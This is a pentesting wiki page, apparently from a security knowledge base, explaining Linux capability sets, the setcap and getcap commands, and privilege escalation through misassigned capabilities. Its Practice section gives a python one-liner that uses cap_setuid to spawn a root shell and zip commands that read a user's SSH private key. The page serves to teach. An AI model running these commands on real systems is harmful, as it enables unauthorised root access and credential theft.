---
authors: ShutdownRepo, p0dalirius
category: infra
---

# 🛠️ Capabilities

## Theory

Linux capabilities are a way to improve permission granularity in unix-like systems. It allows to follow the least-privilege principle by defining fine-grained permissions that can be attributed to threads and files. It works by splitting kernel calls in groups of similar functionalities.

Basic processes : Have no capabilities (file access is controlled by traditional file privileges).

(Binary) files : Can have capabilities (filesystem-dependent).

Capabilities are in separated in 5 sets :

| Set | Description |
| --------------- | ------------------------------------------------------------------------------------------- |
| Effective set | the set that will be used when doing permission check. |
| Permitted set | can be moved to effective set by calling `capset()` |
| Inheritable set | can be inherited from parent processes, can be moved to effective set by calling `capset()` |
| Bounding set | list of all the capabilities a process can ever receive (in its inheritable/permitted sets) |
| Ambiant set | passed to non-suid files without defined capabilities |



#### Capability inheritance, capability drop

* On `fork()` call, the child thread will have the same capabilities as the parent thread.
* `capset()` syscall allows to
 * drop any capability from any set
 * move capabilities from permitted/inherited sets to effective set
* If a thread calls `execve()` on a binary file, its capabilities will be modified following the pattern described in the man pages (see `man capabilities`).

Non-exhaustive capability list :

| Capability | Description |
| ----------------------- | -------------------------------------------------- |
| `CAP_AUDIT_CONTROL` | Toggle kernel auditing |
| `CAP_AUDIT_WRITE` | Write to kernel audit log |
| `CAP_CHOWN` | Change file owners |
| `CAP_SETUID/CAP_SETGID` | Change UID/GID |
| `CAP_NET_RAW` | Open raw and packet sockets |
| `CAP_NET_BIND_SERVICE` | Bind a socket to Internet domain privileged ports |

## Practice

Setting a file's capabilities :

To change capabilities on a file, you need to type these commands as `root` :

```bash
# set capability to change uid to file (+ep to add to effective & permitted)
setcap cap_setuid+ep /path/to/file

# delete capabilites 
setcap -r /path/to/file

# get file(s) capabilities
getcap -r dir 2>/dev/null
getcap file

# listing & decoding a running process' capabilities
grep Cap /proc/$pid/status
capsh --decode=000001ffffffffff
```

Exploiting capabilities :

* Empty capabilities

 If a file has capabilities `/path/to/file =ep` it means it has `all` capabilities _and_ will run as `root`.

> [!TIP]
> To create a file with empty (=all) capabilities just`sudo setcap \=ep /path/to/file` 

Other classic examples :

* If the `python` binary has the `cap_setuid` then it becomes trivial to get a root shell :

```bash
./python -c "import os; os.setuid(0); os.system('/bin/sh')"
```

* Arbitrary file read : `zip` with `cap_dac_read_search`

```bash
# cap_dac_read_search allows zip/tar to read any file (get ssh private key here)
zip /tmp/private_k.zip ~/.ssh/id_rsa
unzip /tmp/private_k.zip -d /tmp
# id_rsa is now readable in the unzipped folder
```

End notes :

When copied from one place to another, a binary will lose its capabilities. In order to keep capabilities, you can copy the file with `--preserve=all` option :

```bash
# to keep capabilities when copying a binary
cp --preserve=all /origin/path /dest/path
```

## Resources

[https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)

[https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

[https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/](https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/)